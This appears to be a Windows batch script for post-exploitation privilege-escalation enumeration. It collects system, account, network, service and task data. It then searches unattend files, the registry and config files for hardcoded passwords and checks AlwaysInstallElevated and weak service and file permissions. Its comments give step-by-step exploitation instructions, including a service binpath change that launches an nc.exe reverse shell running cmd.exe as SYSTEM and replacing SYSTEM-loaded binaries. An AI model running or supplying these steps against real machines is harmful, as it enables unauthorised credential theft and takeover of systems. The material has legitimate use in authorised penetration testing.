echo ################################################################
echo PART 1: ENUMERATE SYSTEM INFO + ACCOUNTS
echo ################################################################

echo >>>>>>>>>>>>>>>>>>>> OS NAME | OS VERSION | HOSTNAME
systeminfo | findstr /C:"OS Name" /C:"OS Version" /C:"Logon Server"

echo >>>>>>>>>>>>>>>>>>>> CURRENT USER
echo %username%
whoami

echo >>>>>>>>>>>>>>>>>>>> LIST OF USERS
net users

echo ################################################################ 
echo PART 2: ENUMERATE NETWORKING
echo ################################################################

echo >>>>>>>>>>>>>>>>>>>> INTERFACES
ipconfig /all

echo >>>>>>>>>>>>>>>>>>>> ROUTING TABLE
route print

echo >>>>>>>>>>>>>>>>>>>> ARP CACHE TABLE
arp -A

echo >>>>>>>>>>>>>>>>>>>> ACTIVE CONNECTIONS + FIREWALL RULES
netstat -ano
netsh firewall show state
netsh firewall show config

echo ################################################################
echo PART 3: ENUMERATE WINDOWS TASKS                        
echo ################################################################
echo NOTE: TAKE THE TIME TO INSPECT ALL BINPATHS FOR WINDOWS SERVICES, SCHEDULED TASKS AND STARTUP TASKS.

echo >>>>>>>>>>>>>>>>>>>> SCHEDULED TASKS (VERBOSE)
schtasks /query /fo LIST /v

echo >>>>>>>>>>>>>>>>>>>> RUNNING PROCESSES / ASSOCIATED SERVICES
tasklist /SVC

echo >>>>>>>>>>>>>>>>>>>> STARTED WINDOWS SERVICES
net start

echo >>>>>>>>>>>>>>>>>>>> 3RD-PARTY DRIVERS
driverquery

echo ################################################################
echo PART 4: QUICK WINS
echo ################################################################

echo >>>>>>>>>>>>>>>>>>>> USER IS AN ADMINISTRATOR
echo NOTE: If your user is part of the "Administrators" group, you can easily get to SYSTEM by reconfiguring a service or creating a scheduled task with SYSTEM privs.
net user %username%

echo >>>>>>>>>>>>>>>>>>>> MISSING WINDOWS PATCHES
echo NOTE: WMIC is mostly not available to non-Administrators.
echo (1) Find Windows privesc exploits.
echo (2) Grep for their existence (using KB numbers) among the list of installed patches.
echo (3) See if any exploits are missing from the patch list.
echo (4) Use exploits and profit.

wmic qfe get Caption,Description,HotFixID,InstalledOn

echo >>>>>>>>>>>>>>>>>>>> HARDCODED CREDENTIALS IN CONFIGURATION FILES
type C:\sysprep.inf
type C:\sysprep\sysprep.xml
type %WINDIR%\Panther\Unattend\Unattended.xml
type %WINDIR%\Panther\Unattended.xml

echo >>>>>>>>>>>>>>>>>>>> MORE HARDCODED CREDENTIALS x2
dir /s *pass* == *cred* == *vnc* == *.config*

echo >>>>>>>>>>>>>>>>>>>> MORE HARDCODED CREDENTIALS x3 (.xml .ini .txt)
findstr /si password *.xml *.ini *.txt

echo >>>>>>>>>>>>>>>>>>>> MORE HARDCODED CREDENTIALS x4 (in registry)
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

echo >>>>>>>>>>>>>>>>>>>> "AlwaysInstallElevated" SETTING
echo This setting allows users of any priv to install .msi files as SYSTEM.
echo Both values need to = 1 to exploit this.

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

echo ################################################################
echo PART 5: DEEP-DIVE WINDOWS SERVICES, FILE/FOLDER PERMISSIONS
echo ################################################################

echo NOTE: FOR RESTARTING SERVICES OR BINARIES, TRY VARIOUS METHODS SUCH AS:
echo => net start
echo => sc start
echo => mysql> RESTART; (using service commands to restart)

echo >>>>>>>>>>>>>>>>>>>> WINDOWS SERVICES (MANUAL ENUM)
echo (1) Query windows service
echo CMD: sc qc [servicename]
echo (2) Check required privilege level for each service using accesschk.exe
echo CMD: accesschk.exe -ucqv UPNPHOST
echo (3) Find services which allow access for "Authenticated Users" (logged-in users). Also check which group your user belongs to.
echo CMD: accesschk.exe -uwcqv "Authenticated Users" *
echo (4) Re-configure services to execute a root-shell.
echo STEP 1: Change binary path to execute a reverse-shell
echo CMD: sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
echo STEP 2: Change password for service
echo CMD: sc config upnphost obj= ".\LocalSystem" password= ""
echo STEP 3: Start the service and execute your reverse-shell
echo CMD: net start upnphost

accesschk.exe -uwcqv "Authenticated Users" * /accepteula

echo >>>>>>>>>>>>>>>>>>>> FILE AND FOLDER PERMISSIONS

echo (1) Check for weak permissions "NT AUTHORITY\AUTHENTICATED USERS: <I> <M>".
echo CMD: icacls [file or folder path] | cacls [file or folder path] | accesschk.exe -dqv [file or folder path]
echo (2) For binaries that load with SYSTEM privileges, replace with your own binary.

echo Finding all weak folder permissions per drive
accesschk.exe -uwdqs Users c:\ /accepteula
accesschk.exe -uwdqs "Authenticated Users" c:\

echo Finding all weak file permissions per drive
accesschk.exe -uwqs Users c:\*.* /accepteula
accesschk.exe -uwqs "Authenticated Users" c:\*.*

echo >>>>>>>>>>>>>>>>>>>> CHECK PATH SYSTEM VARIABLE (MANUAL ENUM)
echo NOTE: All non-default directories in root "C:\" will give WRITE access to the Authenticated Users group!!!

echo Look for non-default dirs: %path%

echo ################################################################
echo ENUMERATION COMPLETE
echo ################################################################
